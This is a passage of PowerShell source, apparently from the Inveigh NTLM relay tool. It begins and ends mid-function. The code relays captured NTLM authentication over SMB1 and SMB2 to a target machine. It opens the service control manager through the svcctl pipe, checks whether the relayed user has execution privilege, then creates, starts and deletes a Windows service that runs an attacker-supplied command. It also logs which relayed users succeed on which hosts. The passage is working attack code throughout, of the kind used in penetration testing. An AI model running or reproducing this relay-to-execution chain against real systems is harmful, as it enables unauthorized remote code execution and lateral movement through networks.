                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_username_full has execution privilege on $Target") > $null

                            if($SCM_data.Length -lt $SMB_split_index)
                            {
                                $SMB_client_stage = 'CreateServiceW'
                            }
                            else
                            {
                                $SMB_client_stage = 'CreateServiceW_First'
                            }

                        }
                        elseif([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '05-00-00-00')
                        {
                            $SMB_relay_failed = $true

                            if($HTTP_NTLM_domain_string -ne '')
                            {
                                $inveigh.relay_user_failed_list.Add("$HTTP_source_IP $HTTP_username_full $Target") > $null
                            }

                            if(!$inveigh.relay_list.Contains("$HTTP_source_IP $Target"))
                            {
                                $inveigh.relay_list.Add("$HTTP_source_IP $Target") > $null
                            }

                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_username_full does not have execution privilege on $Target") > $null
                        }
                        else
                        {
                            $SMB_relay_failed = $true
                        }

                    }
            
                    'CreateServiceW'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $SMB_process_ID $SMB_user_ID
                        $packet_SCM_data = New-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadAndXRequest'
                        $SMB_client_stage_next = 'StartServiceW'   
                    }

                    'CreateServiceW_First'
                    {
                        $SMB_split_stage_final = [Math]::Ceiling($SCM_data.Length / $SMB_split_index)
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $SMB_process_ID $SMB_user_ID
                        $SCM_data_first = $SCM_data[0..($SMB_split_index - 1)]
                        $packet_RPC_data = New-PacketRPCRequest 0x01 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_first
                        $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length)
                        $SMB_split_index_tracker = $SMB_split_index
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length  
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        
                        if($SMB_split_stage_final -le 2)
                        {
                            $SMB_client_stage = 'CreateServiceW_Last'
                        }
                        else
                        {
                            $SMB_split_stage = 2
                            $SMB_client_stage = 'CreateServiceW_Middle'
                        }

                    }

                    'CreateServiceW_Middle'
                    {
                        $SMB_split_stage++
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $SMB_process_ID $SMB_user_ID
                        $SCM_data_middle = $SCM_data[$SMB_split_index_tracker..($SMB_split_index_tracker + $SMB_split_index - 1)]
                        $SMB_split_index_tracker += $SMB_split_index
                        $packet_RPC_data = New-PacketRPCRequest 0x00 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_middle
                        $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length - $SMB_split_index_tracker + $SMB_split_index)
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length 
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        
                        if($SMB_split_stage -ge $SMB_split_stage_final)
                        {
                            $SMB_client_stage = 'CreateServiceW_Last'
                        }
                        else
                        {
                            $SMB_client_stage = 'CreateServiceW_Middle'
                        }

                    }

                    'CreateServiceW_Last'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $SMB_process_ID $SMB_user_ID
                        $SCM_data_last = $SCM_data[$SMB_split_index_tracker..$SCM_data.Length]
                        $packet_RPC_data = New-PacketRPCRequest 0x02 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_last
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length  
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadAndXRequest'
                        $SMB_client_stage_next = 'StartServiceW'
                    }

                    'StartServiceW'
                    {

                        if([System.BitConverter]::ToString($SMB_client_receive[112..115]) -eq '00-00-00-00')
                        {
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] SMB relay service $SMB_service created on $Target") > $null
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Trying to execute SMB relay command on $Target") > $null
                            $SMB_service_context_handle = $SMB_client_receive[92..111]
                            $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $SMB_process_ID $SMB_user_ID
                            $packet_SCM_data = New-PacketSCMStartServiceW $SMB_service_context_handle
                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                            $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                            $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                            $SMB_client_stream.Flush()
                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                            $SMB_client_stage = 'ReadAndXRequest'
                            $SMB_client_stage_next = 'DeleteServiceW'  
                        }
                        elseif([System.BitConverter]::ToString($SMB_client_receive[112..115]) -eq '31-04-00-00')
                        {
                            $SMB_relay_failed = $true
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] SMB relay service $SMB_service creation failed on $Target") > $null
                        }
                        else
                        {
                            $SMB_relay_failed = $true
                        }

                    }
            
                    'DeleteServiceW'
                    { 

                        if([System.BitConverter]::ToString($SMB_client_receive[88..91]) -eq '1d-04-00-00')
                        {
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] SMB relay command executed on $Target") > $null
                        }
                        elseif([System.BitConverter]::ToString($SMB_client_receive[88..91]) -eq '02-00-00-00')
                        {
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] SMB relay service $SMB_service failed to start on $Target") > $null
                        }

                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $SMB_process_ID $SMB_user_ID
                        $packet_SCM_data = New-PacketSCMDeleteServiceW $SMB_service_context_handle
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x02,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadAndXRequest'
                        $SMB_client_stage_next = 'CloseServiceHandle'
                        $SMB_close_service_handle_stage = 1
                    }

                    'CloseServiceHandle'
                    {

                        if($SMB_close_service_handle_stage -eq 1)
                        {
                            $SMB_close_service_handle_stage++
                            $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_context_handle
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] SMB relay service $SMB_service deleted on $Target") > $null
                        }
                        else
                        {
                            $SMB_client_stage = 'CloseRequest'
                            $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_manager_context_handle
                        }

                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $SMB_process_ID $SMB_user_ID
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x05,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                    }

                    'CloseRequest'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x04 0x18 0x07,0xc8 $SMB_tree_ID $SMB_process_ID $SMB_user_ID
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBCloseRequest 0x00,0x40
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'TreeDisconnect'
                    }

                    'TreeDisconnect'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x71 0x18 0x07,0xc8 $SMB_tree_ID $SMB_process_ID $SMB_user_ID
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBTreeDisconnectRequest
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'Logoff'
                    }

                    'Logoff'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x74 0x18 0x07,0xc8 0x34,0xfe $SMB_process_ID $SMB_user_ID
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBLogoffAndXRequest
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'Exit'
                    }

                }
        
                if($SMB_relay_failed)
                {
                    $SMB_client_stage = 'Exit'
                    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay failed on $Target") > $null
                }
        
            }

        }  
        else
        {
        
            $SMB_client_stage = 'TreeConnect'

            :SMB_execute_loop while ($SMB_client_stage -ne 'exit')
            {

                switch ($SMB_client_stage)
                {
        
                    'TreeConnect'
                    {
                        $SMB2_message_ID = 4
                        $SMB2_tree_ID = 0x00,0x00,0x00,0x00
                        $packet_SMB2_header = New-PacketSMB2Header 0x03,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_data = New-PacketSMB2TreeConnectRequest $SMB_path_bytes
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'CreateRequest'
                    }
                
                    'CreateRequest'
                    {
                        $SMB2_tree_ID = 0x01,0x00,0x00,0x00
                        $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \svcctl
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_data = New-PacketSMB2CreateRequestFile $SMB_named_pipe_bytes
                        $packet_SMB2_data["Share_Access"] = 0x07,0x00,0x00,0x00  
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data  
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'RPCBind'
                    }
            
                    'RPCBind'
                    {
                        $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \svcctl
                        $SMB_file_ID = $SMB_client_receive[132..147]
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_RPC_data = New-PacketRPCBind 1 0xb8,0x10 0x01 0x00,0x00 $SMB_named_pipe_UUID 0x02,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadRequest'
                        $SMB_client_stage_next = 'OpenSCManagerW'
                    }
            
                    'ReadRequest'
                    {
                        Start-Sleep -m 150
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x08,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_data = New-PacketSMB2ReadRequest $SMB_file_ID
                        $packet_SMB2_data["Length"] = 0xff,0x00,0x00,0x00
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -ne '03-01-00-00')
                        {
                            $SMB_client_stage = $SMB_client_stage_next
                        }
                        else
                        {
                            $SMB_client_stage = 'StatusPending'
                        }

                    }

                    'StatusPending'
                    {
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)

                        if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -ne '03-01-00-00')
                        {
                            $SMB_client_stage = $SMB_client_stage_next
                        }

                    }
            
                    'OpenSCManagerW'
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SCM_data = New-PacketSCMOpenSCManagerW $SMB_service_bytes $SMB_service_length
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadRequest'
                        $SMB_client_stage_next = 'CheckAccess'           
                    }

                    'CheckAccess'
                    {
                        
                        if([System.BitConverter]::ToString($SMB_client_receive[128..131]) -eq '00-00-00-00' -and [System.BitConverter]::ToString($SMB_client_receive[108..127]) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00')
                        {
                            $SMB_service_manager_context_handle = $SMB_client_receive[108..127]
                            $packet_SCM_data = New-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes
                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_username_full has command execution privilege on $Target") > $null

                            if($Attack -eq 'Session')
                            {
                                $SMB_administrator = $true
                                $SMB_close_service_handle_stage = 2
                                $SMB_client_stage = 'CloseServiceHandle'
                            }
                            elseif($SCM_data.Length -lt $SMB_split_index)
                            {
                                $SMB_client_stage = 'CreateServiceW'
                            }
                            else
                            {
                                $SMB_client_stage = 'CreateServiceW_First'
                            }

                        }
                        elseif([System.BitConverter]::ToString($SMB_client_receive[128..131]) -eq '05-00-00-00')
                        {

                            if($HTTP_NTLM_domain_string -ne '')
                            {
                                $inveigh.relay_user_failed_list.Add("$HTTP_source_IP $HTTP_username_full $Target") > $null
                            }

                            if(!$inveigh.relay_list.Contains("$HTTP_source_IP $Target"))
                            {
                                $inveigh.relay_list.Add("$HTTP_source_IP $Target") > $null
                            }
                            
                            if($Attack -ne 'Session')
                            {
                                $SMB_relay_failed = $true
                                $inveigh.relay_list.Add("0 $HTTP_source_IP $HTTP_username_full $Target") > $null
                            }

                            $inveigh.output_queue.Add("[!] $(Get-Date -format s) $HTTP_username_full does not have command execution privilege on $Target") > $null
                            $SMB_service_manager_context_handle = $SMB_client_receive[108..127]
                            $SMB_close_service_handle_stage = 2
                            $SMB2_message_ID++
                            $SMB_client_stage = 'CloseServiceHandle'
                        }
                        else
                        {
                            $SMB_relay_failed = $true
                        }

                    }
            
                    'CreateServiceW'
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadRequest'
                        $SMB_client_stage_next = 'StartServiceW'  
                    }

                    'CreateServiceW_First'
                    {
                        $SMB_split_stage_final = [Math]::Ceiling($SCM_data.Length / $SMB_split_index)
                        $SMB2_message_ID++
                        $SCM_data_first = $SCM_data[0..($SMB_split_index - 1)]
                        $packet_RPC_data = New-PacketRPCRequest 0x01 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_first
                        $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length)
                        $SMB_split_index_tracker = $SMB_split_index
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        
                        if($SMB_split_stage_final -le 2)
                        {
                            $SMB_client_stage = 'CreateServiceW_Last'
                        }
                        else
                        {
                            $SMB_split_stage = 2
                            $SMB_client_stage = 'CreateServiceW_Middle'
                        }

                    }

                    'CreateServiceW_Middle'
                    {
                        $SMB_split_stage++
                        $SMB2_message_ID++
                        $SCM_data_middle = $SCM_data[$SMB_split_index_tracker..($SMB_split_index_tracker + $SMB_split_index - 1)]
                        $SMB_split_index_tracker += $SMB_split_index
                        $packet_RPC_data = New-PacketRPCRequest 0x00 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_middle
                        $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length - $SMB_split_index_tracker + $SMB_split_index)
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB2_message_ID $SMB_process_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
